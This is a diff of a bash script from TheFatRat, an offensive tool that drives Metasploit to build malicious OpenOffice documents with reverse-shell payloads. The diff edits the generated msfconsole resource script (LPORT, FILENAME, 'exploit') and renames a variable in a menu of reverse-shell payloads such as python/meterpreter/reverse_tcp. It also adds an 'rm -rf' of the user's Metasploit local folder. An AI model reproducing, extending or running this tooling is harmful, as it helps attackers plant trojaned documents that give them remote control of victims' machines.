@@ -1076,6 +1076,9 @@ CODENAME='Mario Bros'
 	echo -e $white"  |"$okegreen"4$white| "$cyan"Apache OpenOffice on Windows (PSH)"
 	echo -e $white"  |"$okegreen"5$white| "$cyan"Apache OpenOffice on Linux/OSX (Python)"
 	echo -e $white"  |"$okegreen"6$white| "$cyan"Exit\n"
+
+# Seems to fix some metasploit bugs
+rm -rf ~/.msf4/local/* >/dev/null 2>&1
 echo -n -e $red'  \033[4mMicrosploit@fatrat:\033[0m>> '; tput sgr0
 read choice
 case $choice in
@@ -1439,7 +1442,7 @@ echo -e $okegreen ""
           echo "set LPORT $yourport" >> $meterp
           echo "set FILENAME $fira.odt" >> $meterp
           echo "set BODY $bodys" >> $meterp
-          echo "exploit -z" >> $meterp
+          echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
           msploitr
           xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
@@ -1494,7 +1497,7 @@ fi
 						fi
 
 					echo ""
-					payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "python/meterpreter/reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
+					payloads=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "python/meterpreter/reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 					spinlong
 					echo ""
 					echo ""
